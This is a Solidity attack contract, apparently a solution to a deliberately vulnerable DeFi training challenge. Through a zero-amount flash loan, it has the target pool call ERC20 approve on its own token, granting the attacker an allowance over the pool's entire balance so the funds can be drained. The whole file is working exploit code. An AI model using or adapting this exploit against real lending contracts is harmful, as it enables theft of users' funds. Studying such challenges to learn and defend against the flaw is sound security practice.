// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterLenderPoolAttacker {
    IERC20 dvt;
    TrusterLenderPool pool;
    address attacker;

    constructor(address _poolAddress, address _dvtAddress) {
        pool = TrusterLenderPool(_poolAddress);
        dvt = IERC20(_dvtAddress);
        attacker = msg.sender;
    }

    function Attack() public {
        require(attacker == msg.sender, "Only attacker can attack");
        uint256 poolBalance = dvt.balanceOf(address(pool));
        pool.flashLoan(
            0, address(this), address(dvt), abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance)
        );
    }
}
